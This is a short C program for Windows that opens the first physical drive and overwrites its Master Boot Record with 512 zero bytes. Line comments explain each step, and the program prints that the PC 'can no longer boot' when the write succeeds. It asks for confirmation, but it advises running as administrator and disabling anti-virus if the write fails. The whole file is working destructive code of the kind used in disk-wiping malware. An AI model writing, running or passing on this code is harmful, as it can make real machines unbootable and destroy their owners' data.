#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <Windows.h>

int main(){ 
    int response; //Holds the value the user entered, so if 1 then we continue to overwring. 
    DWORD bytesWritten; //This holds 0 right now, but if we overwrite the MBR, it will hold 512 bytes, since thats how big the MBR is. 
    char trashData[512]; //This is an array, its maximum length is 512 bytes, this will hold the trash data that will overwrite the MBR.
    HANDLE MasterBootRecord = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    //this handle is basically a pointer, it points to the disk, then we will write to it, the MBR is the very first thing on the disk so we can just write 512 bytes to this disk and it will destory the MBR.

    printf("Are you sure you want to overwrite your MBR (1 = Yes): "); 

    scanf("%d", &response); //Gets the userinput, if 1, then continue, if anything else, exit.

    if(response == 1){
        //This is if the handle to the provided address doesnt exist, or access is denied.
        if(MasterBootRecord == INVALID_HANDLE_VALUE){
            printf("Invalid handle? Your disk might be gpt, or you haven't ran as admin."); 
            CloseHandle(MasterBootRecord); //Since it doesnt exist, we will just close the handle and exit the program.
            Sleep(3000); //Freeze the terminal, or just freeze everything for 3 seconds.
            exit(0); 
        }
        else{
            ZeroMemory(trashData, 512); //This will fill our array with 0's. Or 512 bytes of 0's. 
           
            //Tries to write to MasterBootRecord, with trashdata, the amount we wanna write is 512, and we want to record how much was written and store it in bytesWritten
            if(WriteFile(MasterBootRecord,trashData,512,&bytesWritten,NULL) == TRUE){
                switch (bytesWritten){
                    case 512: //if 512 bytes we're written, we show this.
                        printf("MBR successfully overwritten, this pc can no longer boot."); 
                        Sleep(5000);
                    exit(0);
                     

                    case 0: //if nothing was written, we show this
                        printf("MBR was NOT overwritten, try disabling anti-virus and run as ADMIN.");
                        Sleep(5000);
                    exit(0);
                    

                    default: //if we wrote anything else, like 200 bytes, we show this.
                        printf("The MBR was probably corrupted, %lu bytes we're written to the MBR.", bytesWritten);
                        Sleep(5000);
                    exit(0);
                }
             }
        }
    }
    else{
        
        printf("Exiting...");
        CloseHandle(MasterBootRecord); 
        Sleep(3000); 
        exit(0); 
    }
}
